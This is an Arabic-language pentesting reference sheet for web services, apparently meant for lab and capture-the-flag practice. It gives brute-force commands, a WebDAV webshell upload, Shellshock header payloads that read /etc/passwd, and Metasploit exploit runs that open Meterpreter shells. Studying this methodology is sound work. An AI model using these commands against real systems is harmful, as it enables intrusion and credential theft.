HTTP / HTTPS — من الفحص إلى ما بعد الاستغلال

مرجع سريع لخدمات الويب: اكتشاف التقنية، المسارات، المصادقة، WebDAV والاستغلال المرتبط بالإصدار.

✒ Abdullah Nasser Almsan — Personal Pentest Reference
ملاحظة عن البورت: الشائع HTTP على 80/TCP وHTTPS على 443/TCP، لكن تطبيقات الويب كثير تظهر على 8000 و8080 و8888 أو بورت غير قياسي. لا تعتمد على رقم البورت وحده؛ تأكد من الخدمة والإصدار.

1. Reconnaissance

حدد عنوانك والهدف، ثم تأكد من الوصول قبل التعمق في الويب.

معرفة عنوانك وواجهة اللاب KALI TERMINAL
ip a ifconfig
اختبار الوصول للهدف KALI TERMINAL
ping -c 4 [TARGET]
عدم الرد على ICMP لا يعني أن الهدف متوقف؛ انتقل للفحص باستخدام -Pn إذا لزم.
فتح الخدمة مباشرة وملاحظة التحويلات BROWSER
http://[TARGET] https://[TARGET]
لاحظ العنوان النهائي، اسم التطبيق، صفحة تسجيل الدخول وأي Virtual Host يظهر في التحويل.

2. Port Scanning

ابدأ بالبورتات الشائعة ثم وسّع الفحص إذا لم تظهر الخدمة.

فحص بورتات الويب الشائعة مع Service Detection KALI TERMINAL
nmap -p80,443,8000,8080,8888 -sV [TARGET]
80/tcp open http 443/tcp open https 8080/tcp open http-proxy
فحص شامل للبورتات KALI TERMINAL
nmap -p- -sV -Pn [TARGET]
مفيد إذا كان Web Server شغال على بورت غير معتاد.
فحص HTTP Scripts الأساسية KALI TERMINAL
nmap -p[PORT] --script=http-enum,http-headers,http-methods [TARGET]
إذا اكتشفت مسار مهم مثل /webdav/ أعد الفحص مع تحديد المسار بدل فحص الجذر فقط.
فحص شامل لكل البورتات KALI TERMINAL
nmap --top-ports 65536 [TARGET]
✓ مثال عام: 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 5985/tcp open wsman 47001/tcp open winrm
لاحظ ظهور WinRM (5985) هنا — سبب إضافي ليش لازم تفحص top-ports واسع مو بس البورتات القياسية
تحديد إصدار الخدمة بالضبط على 80 KALI TERMINAL
nmap -sV -p80 [TARGET]
✓ مثال عام: 80/tcp open http HttpFileServer httpd 2.3
دوّن اسم السيرفر والإصدار بالضبط — هذا يوجهك مباشرة لمرحلة searchsploit بالاستغلال

3. Enumeration

حدد التقنية والإصدار والمسارات والـMethods قبل اختيار أي مسار استغلال.

Technology & Version

WhatWeb KALI TERMINAL
whatweb http://[TARGET]:[PORT]
HTTP Headers KALI TERMINAL
curl -I http://[TARGET]:[PORT] curl -k -I https://[TARGET]:[PORT]
تحديد إصدار HTTP عبر Metasploit MSFCONSOLE
use auxiliary/scanner/http/http_version set RHOSTS [TARGET] set RPORT [PORT] run

Directory & File Enumeration

Gobuster KALI TERMINAL
gobuster dir -u http://[TARGET]:[PORT] -w [WORDLIST] -b 404 -x .php,.xml,.txt -r
Dirb KALI TERMINAL
dirb http://[TARGET]:[PORT] [WORDLIST]
Nikto Web Scan KALI TERMINAL
nikto -h http://[TARGET]:[PORT]
استخدم النتيجة كدليل لمواضع تحتاج تحقق يدوي، وليس كإثبات نهائي لوجود ثغرة.
Robots.txt عبر Metasploit MSFCONSOLE
use auxiliary/scanner/http/robots_txt set RHOSTS [TARGET] set RPORT [PORT] run

Methods & WebDAV

فحص HTTP Methods لمسار محدد KALI TERMINAL
nmap -p[PORT] --script=http-methods --script-args http-methods.url-path=/webdav/ [TARGET]
اكتشاف WebDAV KALI TERMINAL
nmap -p[PORT] --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ [TARGET]
OPTIONS وPROPFIND قد تكشف أن المسار يدعم WebDAV.
اختبار WebDAV باستخدام DAVTest KALI TERMINAL
davtest -url http://[TARGET]:[PORT]/webdav davtest -auth [USERNAME]:[PASSWORD] -url http://[TARGET]:[PORT]/webdav
SUCCEED: ... file was uploaded successfully
عبر Nmap NSE — أسرع طريقة أولية KALI TERMINAL
nmap --script http-enum -sV -p80 [TARGET]
✓ مثال عام: /webdav/: Potentially interesting folder (401 Unauthorized)
لو http-enum طوّل أو ما رجع شي، انتقل لـdirb كبديل أشمل
Dirb — أشمل بس أبطأ KALI TERMINAL
dirb http://[TARGET]/
Gobuster — بديل أسرع من dirb KALI TERMINAL
gobuster dir -u http://[TARGET]/ -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.xml -b 404 -r
اختبار صلاحيات الرفع/التنفيذ على WebDAV KALI TERMINAL
davtest -url http://[TARGET]/webdav
✓ مثال عام: OPEN FAIL: Unauthorized. Basic realm="[TARGET_DOMAIN]" — المسار موجود بس محمي بمصادقة
لو رجع Unauthorized، هذا يعني المسار موجود فعلًا — روح لمرحلة Credential Testing بدل ما تستبعده
Nikto — فحص شامل KALI TERMINAL
nikto -h http://[TARGET]
البحث عن Exploits جاهزة حسب اسم/إصدار السيرفر KALI TERMINAL
searchsploit [SERVER_NAME]
مثال عام: searchsploit hfs رجع Rejetto HFS 2.3 Remote Command Execution مباشرة
توجيه المتصفح عبر Burp Suite BROWSER PROXY SETTINGS
Proxy: 127.0.0.1:8080
بعدها كل الطلبات تظهر بـBurp → Proxy → HTTP History لتحليلها يدويًا

4. Credential Testing

حدد نوع المصادقة أولًا، ثم اختبر بيانات الدخول بالطريقة المطابقة لها داخل اللاب المصرح.

HTTP Basic / GET Authentication

Hydra على مسار محمي KALI TERMINAL
hydra -L [USERLIST] -P [WORDLIST] -f [TARGET] http-get /[PATH]
Metasploit HTTP Login Scanner MSFCONSOLE
use auxiliary/scanner/http/http_login set RHOSTS [TARGET] set RPORT [PORT] set AUTH_URI /[PATH] set USER_FILE [USERLIST] set PASS_FILE [WORDLIST] run

Login Form

Hydra على POST Form KALI TERMINAL
hydra -L [USERLIST] -P [WORDLIST] [TARGET] http-post-form "/login.php:login=^USER^&password=^PASS^&form=submit:Invalid credentials"
غيّر أسماء الحقول ورسالة الفشل حسب الطلب الحقيقي الذي تراه في Burp Suite.
التقاط طلب تسجيل الدخول BURP SUITE
Proxy → Intercept → Submit login → Inspect request parameters and failure response
الهدف هنا معرفة أسماء Parameters ومؤشر فشل الدخول بدقة قبل بناء أمر Hydra.
التحقق اليدوي من بيانات مكتشفة على مسار محمي KALI TERMINAL
davtest -auth [USER]:[PASS] -url http://[TARGET]/webdav
✓ مثال عام (بيانات [USERNAME]:[PASSWORD]): رفع ناجح لعدة صيغ ملفات (cgi, pl, asp, html) وتنفيذ فعلي لملفي .asp و.txt

5. Exploitation

الاستغلال يعتمد على المنتج والإصدار والـpreconditions المكتشفة، وليس على وجود HTTP وحده.

تحذير: تأكد من الإصدار قبل أي exploit. لا تختَر Module لمجرد أن البورت 80/443 مفتوح.

Windows — WebDAV WINDOWS

رفع Webshell عبر Cadaver بعد نجاح المصادقة KALI TERMINAL
cadaver http://[TARGET]:[PORT]/webdav put /usr/share/webshells/asp/webshell.asp
تشغيل الأمر من الـWebshell BROWSER
http://[TARGET]:[PORT]/webdav/webshell.asp?cmd=whoami
WebDAV Upload عبر Metasploit MSFCONSOLE
use exploit/windows/iis/iis_webdav_upload_asp set RHOSTS [TARGET] set RPORT [PORT] set PATH /webdav/metasploit%RAND%.asp set HttpUsername [USERNAME] set HttpPassword [PASSWORD] run

Linux — Shellshock LINUX

فحص CGI لـShellshock KALI TERMINAL
nmap -p[PORT] --script=http-shellshock --script-args "http-shellshock.uri=/[CGI_PATH]" [TARGET]
تحقق يدوي من التنفيذ عبر Header BURP SUITE
User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'
استخدمه فقط إذا كان CGI والإصدار/السلوك متوافقًا مع Shellshock.

Version-Specific Web Services

البحث عن Module مطابق للخدمة والإصدار MSFCONSOLE
search type:exploit http [PRODUCT] info [MODULE]
من المسارات التي قد تقابلها في اللابات: HFS، BadBlue، GlassFish، Tomcat أو تطبيقات رفع ملفات ضعيفة. استخدم فقط ما يطابق نتيجة الـEnumeration.
الاستغلال الكامل MSFCONSOLE
msfconsole -q use exploit/windows/http/rejetto_hfs_exec set RPORT 80 set RHOSTS [TARGET] set LHOST [ATTACKER_IP] exploit
✓ مثال عام: Meterpreter session 1 opened → flag.txt = [FLAG]
الاستغلال الكامل (بعد بيانات دخول صحيحة) MSFCONSOLE
msfconsole -q use exploit/windows/iis/iis_webdav_upload_asp set RHOSTS [TARGET] set HttpUsername [USER] set HttpPassword [PASS] set PATH /webdav/metasploit%RAND%.asp exploit
✓ مثال عام: Uploading → Moving → Executing → Meterpreter session 1 opened
هذا المسار يلخّص كل مراحل الـEnumeration/Credential السابقة بخطوة واحدة تلقائية بدل davtest اليدوي
البحث عن الثغرة حسب الإصدار BROWSER / KALI TERMINAL
searchsploit apache tomcat [VERSION] # أو ابحث يدويًا: "apache tomcat [VERSION] exploit"
الاستغلال الكامل MSFCONSOLE
use exploit/multi/http/tomcat_jsp_upload_bypass set RHOSTS [TARGET] set RPORT [PORT] check exploit
✓ مثال عام (Tomcat 8.5.19): [+] The target is vulnerable → Command shell session 1 opened
استخدم check دايمًا قبل exploit لو الوحدة تدعمه — يوفر عليك وقت لو النسخة مو متأثرة
فحص واستغلال عبر Header مُعدّل BURP SUITE — REPEATER
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
لازم تعرف مسار ملف الـCGI أولًا (من نتائج Directory Enumeration) وتوجه الطلب له مباشرة

6. Post-Exploitation

بعد الحصول على تنفيذ أو Shell، نفّذ التحقق الفوري فقط ثم انتقل لمرجع Post-Exploitation العام.

تأكيد الهوية على Linux VICTIM SHELL
whoami id
تأكيد الهوية على Windows WINDOWS CMD
whoami hostname
ترقية Shell بسيط على Linux عند الحاجة VICTIM SHELL
python3 -c 'import pty; pty.spawn("/bin/bash")'
بعد إثبات الوصول لا تكرر هنا Credential Dumping أو Pivoting أو Enumeration الشامل؛ انتقل للمرجع العام المناسب.
تأكيد الهوية والبحث عن Flag METERPRETER / VICTIM SHELL
shell cd / dir type flag.txt
